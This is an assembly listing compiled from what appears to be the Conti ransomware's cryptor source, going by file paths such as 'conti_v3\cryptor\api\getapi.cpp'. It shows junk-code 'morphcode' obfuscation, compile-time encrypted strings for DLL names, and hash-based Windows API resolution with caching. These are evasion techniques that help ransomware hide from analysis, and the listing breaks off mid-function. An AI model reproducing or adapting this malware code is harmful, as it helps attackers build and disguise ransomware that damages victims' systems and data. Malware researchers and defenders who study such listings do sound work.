  0009b	75 0a		 jne	 SHORT $LN5@morphcode
  0009d	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000a0	ff c0		 inc	 eax
  000a2	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  000a5	eb e5		 jmp	 SHORT $LN4@morphcode
$LN5@morphcode:

; 55   : 	}

  000a7	e9 b9 00 00 00	 jmp	 $LN13@morphcode
$LN12@morphcode:

; 56   : 	else if (_morph_var % 4) {

  000ac	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000af	99		 cdq
  000b0	83 e2 03	 and	 edx, 3
  000b3	03 c2		 add	 eax, edx
  000b5	83 e0 03	 and	 eax, 3
  000b8	2b c2		 sub	 eax, edx
  000ba	85 c0		 test	 eax, eax
  000bc	74 4b		 je	 SHORT $LN14@morphcode

; 57   : 		_morph_var = (_morph_var + 2) * ((int)a + 3);

  000be	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000c1	83 c0 02	 add	 eax, 2
  000c4	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR a$[rbp]
  000ca	83 c1 03	 add	 ecx, 3
  000cd	0f af c1	 imul	 eax, ecx
  000d0	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN6@morphcode:

; 58   : 		while (!(_morph_var % 2))

  000d3	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000d6	99		 cdq
  000d7	83 e0 01	 and	 eax, 1
  000da	33 c2		 xor	 eax, edx
  000dc	2b c2		 sub	 eax, edx
  000de	85 c0		 test	 eax, eax
  000e0	75 25		 jne	 SHORT $LN7@morphcode

; 59   : 			if (_morph_var % 5)

  000e2	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000e5	99		 cdq
  000e6	b9 05 00 00 00	 mov	 ecx, 5
  000eb	f7 f9		 idiv	 ecx
  000ed	8b c2		 mov	 eax, edx
  000ef	85 c0		 test	 eax, eax
  000f1	74 0a		 je	 SHORT $LN16@morphcode

; 60   : 				--_morph_var;

  000f3	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000f6	ff c8		 dec	 eax
  000f8	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  000fb	eb 08		 jmp	 SHORT $LN17@morphcode
$LN16@morphcode:

; 61   : 			else ++_morph_var;

  000fd	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00100	ff c0		 inc	 eax
  00102	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN17@morphcode:
  00105	eb cc		 jmp	 SHORT $LN6@morphcode
$LN7@morphcode:

; 62   : 	}

  00107	eb 5c		 jmp	 SHORT $LN15@morphcode
$LN14@morphcode:

; 63   : 	else if (_morph_var % 5) {

  00109	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0010c	99		 cdq
  0010d	b9 05 00 00 00	 mov	 ecx, 5
  00112	f7 f9		 idiv	 ecx
  00114	8b c2		 mov	 eax, edx
  00116	85 c0		 test	 eax, eax
  00118	74 4b		 je	 SHORT $LN18@morphcode

; 64   : 		_morph_var = (_morph_var + 11) / ((int)a + 23);

  0011a	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0011d	83 c0 0b	 add	 eax, 11
  00120	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR a$[rbp]
  00126	83 c1 17	 add	 ecx, 23
  00129	99		 cdq
  0012a	f7 f9		 idiv	 ecx
  0012c	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN8@morphcode:

; 65   : 		while (!(_morph_var % 3))

  0012f	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00132	99		 cdq
  00133	b9 03 00 00 00	 mov	 ecx, 3
  00138	f7 f9		 idiv	 ecx
  0013a	8b c2		 mov	 eax, edx
  0013c	85 c0		 test	 eax, eax
  0013e	75 25		 jne	 SHORT $LN9@morphcode

; 66   : 			if (_morph_var % 5)

  00140	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00143	99		 cdq
  00144	b9 05 00 00 00	 mov	 ecx, 5
  00149	f7 f9		 idiv	 ecx
  0014b	8b c2		 mov	 eax, edx
  0014d	85 c0		 test	 eax, eax
  0014f	74 0a		 je	 SHORT $LN19@morphcode

; 67   : 				++_morph_var;

  00151	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00154	ff c0		 inc	 eax
  00156	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  00159	eb 08		 jmp	 SHORT $LN20@morphcode
$LN19@morphcode:

; 68   : 			else --_morph_var;

  0015b	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0015e	ff c8		 dec	 eax
  00160	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN20@morphcode:
  00163	eb ca		 jmp	 SHORT $LN8@morphcode
$LN9@morphcode:
$LN18@morphcode:
$LN15@morphcode:
$LN13@morphcode:
$LN11@morphcode:

; 69   : 	}
; 70   : }

  00165	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0016c	5f		 pop	 rdi
  0016d	5d		 pop	 rbp
  0016e	c3		 ret	 0
?morphcode@@YAXH@Z ENDP					; morphcode
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 224
n$ = 232
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 40   :     return (a % n + n) % n;

  00022	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  00028	99		 cdq
  00029	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0002f	8b c2		 mov	 eax, edx
  00031	03 85 e8 00 00
	00		 add	 eax, DWORD PTR n$[rbp]
  00037	99		 cdq
  00038	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0003e	8b c2		 mov	 eax, edx

; 41   : }

  00040	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00047	5f		 pop	 rdi
  00048	5d		 pop	 rbp
  00049	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z
_TEXT	SEGMENT
Addr$ = 8
Dll$ = 256
ModuleId$ = 264
Hash$ = 272
CacheIndex$ = 280
?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z PROC		; getapi::GetProcAddressEx2, COMDAT

; 681  : {

$LN4:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001c	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 682  : 	//      
; 683  : 	LPVOID Addr = NULL;

  0002d	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR Addr$[rbp], 0

; 684  : 
; 685  : 	Addr = g_ApiCache[CacheIndex];

  00035	48 63 85 18 01
	00 00		 movsxd	 rax, DWORD PTR CacheIndex$[rbp]
  0003c	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_ApiCache@@3PEAPEAXEA ; g_ApiCache
  00043	48 8b 04 c1	 mov	 rax, QWORD PTR [rcx+rax*8]
  00047	48 89 45 08	 mov	 QWORD PTR Addr$[rbp], rax

; 686  : 	morphcode(Addr);

  0004b	48 8b 4d 08	 mov	 rcx, QWORD PTR Addr$[rbp]
  0004f	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 687  : 
; 688  : 	if (!Addr) {

  00054	48 83 7d 08 00	 cmp	 QWORD PTR Addr$[rbp], 0
  00059	75 3c		 jne	 SHORT $LN2@GetProcAdd

; 689  : 
; 690  : 		//    .       
; 691  : 		Addr = GetProcAddressEx(Dll, ModuleId, Hash);

  0005b	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR Hash$[rbp]
  00062	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR ModuleId$[rbp]
  00068	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR Dll$[rbp]
  0006f	e8 00 00 00 00	 call	 ?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z ; getapi::GetProcAddressEx
  00074	48 89 45 08	 mov	 QWORD PTR Addr$[rbp], rax

; 692  : 
; 693  : 		morphcode(Addr);

  00078	48 8b 4d 08	 mov	 rcx, QWORD PTR Addr$[rbp]
  0007c	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 694  : 
; 695  : 		g_ApiCache[CacheIndex] = Addr;

  00081	48 63 85 18 01
	00 00		 movsxd	 rax, DWORD PTR CacheIndex$[rbp]
  00088	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_ApiCache@@3PEAPEAXEA ; g_ApiCache
  0008f	48 8b 55 08	 mov	 rdx, QWORD PTR Addr$[rbp]
  00093	48 89 14 c1	 mov	 QWORD PTR [rcx+rax*8], rdx
$LN2@GetProcAdd:

; 696  : 
; 697  : 	}
; 698  : 	return Addr;

  00097	48 8b 45 08	 mov	 rax, QWORD PTR Addr$[rbp]

; 699  : }

  0009b	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  000a2	5f		 pop	 rdi
  000a3	5d		 pop	 rbp
  000a4	c3		 ret	 0
?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ENDP		; getapi::GetProcAddressEx2
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z
_TEXT	SEGMENT
hModule$ = 8
ProcAddress$ = 40
Advapi32DLL$ = 72
Kernel32DLL$ = 104
Netapi32DLL$ = 136
IphlpapiDLL$ = 168
RstrtmgrDLL$ = 200
Ws2_32DLL$ = 232
User32DLL$ = 264
ShlwapiDLL$ = 296
Shell32DLL$ = 328
Ole32DLL$ = 360
OleAut32DLL$ = 392
NtdllDLL$ = 424
$T4 = 840
$T5 = 888
$T6 = 936
$T7 = 984
$T8 = 1032
$T9 = 1080
$T10 = 1128
$T11 = 1176
$T12 = 1224
$T13 = 1272
$T14 = 1320
$T15 = 1368
tv167 = 1396
__$ArrayPad$ = 1400
ModuleName$ = 1440
ModuleId$ = 1448
Hash$ = 1456
?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z PROC		; getapi::GetProcAddressEx, COMDAT

; 557  : {

$LN23:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec a8 05
	00 00		 sub	 rsp, 1448		; 000005a8H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00021	b9 02 01 00 00	 mov	 ecx, 258		; 00000102H
  00026	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002b	f3 ab		 rep stosd
  0002d	48 8b 8c 24 c8
	05 00 00	 mov	 rcx, QWORD PTR [rsp+1480]
  00035	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003c	48 33 c5	 xor	 rax, rbp
  0003f	48 89 85 78 05
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00046	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  0004d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 558  : 	HMODULE hModule = NULL;

  00052	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR hModule$[rbp], 0

; 559  : 	ADDR ProcAddress = NULL;

  0005a	48 c7 45 28 00
	00 00 00	 mov	 QWORD PTR ProcAddress$[rbp], 0

; 560  : 
; 561  : 	LPCSTR Advapi32DLL = OBFA("Advapi32.dll");

  00062	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0N@DOHINHCI@Advapi32?4dll@
  00069	48 8d 8d 48 03
	00 00		 lea	 rcx, QWORD PTR $T4[rbp]
  00070	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
  00075	48 8b c8	 mov	 rcx, rax
  00078	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0007d	48 89 45 48	 mov	 QWORD PTR Advapi32DLL$[rbp], rax

; 562  : 	LPCSTR Kernel32DLL = OBFA("Kernel32.dll");

  00081	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0N@HAOHNMDE@Kernel32?4dll@
  00088	48 8d 8d 78 03
	00 00		 lea	 rcx, QWORD PTR $T5[rbp]
  0008f	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
  00094	48 8b c8	 mov	 rcx, rax
  00097	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0009c	48 89 45 68	 mov	 QWORD PTR Kernel32DLL$[rbp], rax

; 563  : 	LPCSTR Netapi32DLL = OBFA("Netapi32.dll");

  000a0	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0N@NKMBPHLD@Netapi32?4dll@
  000a7	48 8d 8d a8 03
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  000ae	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
  000b3	48 8b c8	 mov	 rcx, rax
  000b6	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  000bb	48 89 85 88 00
	00 00		 mov	 QWORD PTR Netapi32DLL$[rbp], rax

; 564  : 	LPCSTR IphlpapiDLL = OBFA("Iphlpapi.dll");

  000c2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0N@KCFEDKNO@Iphlpapi?4dll@
  000c9	48 8d 8d d8 03
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  000d0	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
  000d5	48 8b c8	 mov	 rcx, rax
  000d8	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  000dd	48 89 85 a8 00
	00 00		 mov	 QWORD PTR IphlpapiDLL$[rbp], rax

; 565  : 	LPCSTR RstrtmgrDLL = OBFA("Rstrtmgr.dll");

  000e4	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0N@NKKEACFL@Rstrtmgr?4dll@
  000eb	48 8d 8d 08 04
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  000f2	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
  000f7	48 8b c8	 mov	 rcx, rax
  000fa	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  000ff	48 89 85 c8 00
	00 00		 mov	 QWORD PTR RstrtmgrDLL$[rbp], rax

; 566  : 	LPCSTR Ws2_32DLL = OBFA("ws2_32.dll");

  00106	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0L@EANHMAHB@ws2_32?4dll@
  0010d	48 8d 8d 38 04
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  00114	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
  00119	48 8b c8	 mov	 rcx, rax
  0011c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
  00121	48 89 85 e8 00
	00 00		 mov	 QWORD PTR Ws2_32DLL$[rbp], rax

; 567  : 	LPCSTR User32DLL = OBFA("User32.dll");

  00128	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0L@OKGHKNFP@User32?4dll@
  0012f	48 8d 8d 68 04
	00 00		 lea	 rcx, QWORD PTR $T10[rbp]
  00136	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
  0013b	48 8b c8	 mov	 rcx, rax
  0013e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
  00143	48 89 85 08 01
	00 00		 mov	 QWORD PTR User32DLL$[rbp], rax

; 568  : 	LPCSTR ShlwapiDLL = OBFA("Shlwapi.dll");

  0014a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0M@OHCDEFLB@Shlwapi?4dll@
  00151	48 8d 8d 98 04
	00 00		 lea	 rcx, QWORD PTR $T11[rbp]
  00158	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
  0015d	48 8b c8	 mov	 rcx, rax
  00160	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  00165	48 89 85 28 01
	00 00		 mov	 QWORD PTR ShlwapiDLL$[rbp], rax

; 569  : 	LPCSTR Shell32DLL = OBFA("Shell32.dll");

  0016c	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0M@LNAMDANG@Shell32?4dll@
  00173	48 8d 8d c8 04
	00 00		 lea	 rcx, QWORD PTR $T12[rbp]
  0017a	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
  0017f	48 8b c8	 mov	 rcx, rax
  00182	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  00187	48 89 85 48 01
	00 00		 mov	 QWORD PTR Shell32DLL$[rbp], rax

; 570  : 	LPCSTR Ole32DLL = OBFA("Ole32.dll");

  0018e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_09MDJBOJHM@Ole32?4dll@
  00195	48 8d 8d f8 04
	00 00		 lea	 rcx, QWORD PTR $T13[rbp]
  0019c	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  001a1	48 8b c8	 mov	 rcx, rax
  001a4	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  001a9	48 89 85 68 01
	00 00		 mov	 QWORD PTR Ole32DLL$[rbp], rax

; 571  : 	LPCSTR OleAut32DLL = OBFA("OleAut32.dll");

  001b0	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0N@BHPCGNMJ@OleAut32?4dll@
  001b7	48 8d 8d 28 05
	00 00		 lea	 rcx, QWORD PTR $T14[rbp]
  001be	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
  001c3	48 8b c8	 mov	 rcx, rax
  001c6	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  001cb	48 89 85 88 01
	00 00		 mov	 QWORD PTR OleAut32DLL$[rbp], rax

; 572  : 	LPCSTR NtdllDLL = OBFA("ntdll.dll");

  001d2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_09FLKFJBLM@ntdll?4dll@
  001d9	48 8d 8d 58 05
	00 00		 lea	 rcx, QWORD PTR $T15[rbp]
  001e0	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  001e5	48 8b c8	 mov	 rcx, rax
  001e8	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  001ed	48 89 85 a8 01
	00 00		 mov	 QWORD PTR NtdllDLL$[rbp], rax

; 573  : 
; 574  : 	if (ModuleName)

  001f4	48 83 bd a0 05
	00 00 00	 cmp	 QWORD PTR ModuleName$[rbp], 0
  001fc	74 61		 je	 SHORT $LN4@GetProcAdd

; 575  : 	{
; 576  : 
; 577  : 		morphcode((char*)ModuleName);

  001fe	48 8b 8d a0 05
	00 00		 mov	 rcx, QWORD PTR ModuleName$[rbp]
  00205	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 578  : 
; 579  : 		hModule = pLoadLibraryA(ModuleName);

  0020a	48 8b 8d a0 05
	00 00		 mov	 rcx, QWORD PTR ModuleName$[rbp]
  00211	ff 15 00 00 00
	00		 call	 QWORD PTR ?pLoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA ; pLoadLibraryA
  00217	48 89 45 08	 mov	 QWORD PTR hModule$[rbp], rax

; 580  : 
; 581  : 		morphcode(hModule);

  0021b	48 8b 4d 08	 mov	 rcx, QWORD PTR hModule$[rbp]
  0021f	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 582  : 
; 583  : 		if (hModule) {

  00224	48 83 7d 08 00	 cmp	 QWORD PTR hModule$[rbp], 0
  00229	74 28		 je	 SHORT $LN6@GetProcAdd

; 584  : 
; 585  : 			ProcAddress = GetApiAddr(hModule, Hash, &ProcAddress);

  0022b	4c 8d 45 28	 lea	 r8, QWORD PTR ProcAddress$[rbp]
  0022f	8b 95 b0 05 00
	00		 mov	 edx, DWORD PTR Hash$[rbp]
  00235	48 8b 4d 08	 mov	 rcx, QWORD PTR hModule$[rbp]
  00239	e8 00 00 00 00	 call	 ?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z ; GetApiAddr
  0023e	48 89 45 28	 mov	 QWORD PTR ProcAddress$[rbp], rax

; 586  : 
; 587  : 			morphcode(ProcAddress);

  00242	8b 4d 28	 mov	 ecx, DWORD PTR ProcAddress$[rbp]
  00245	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

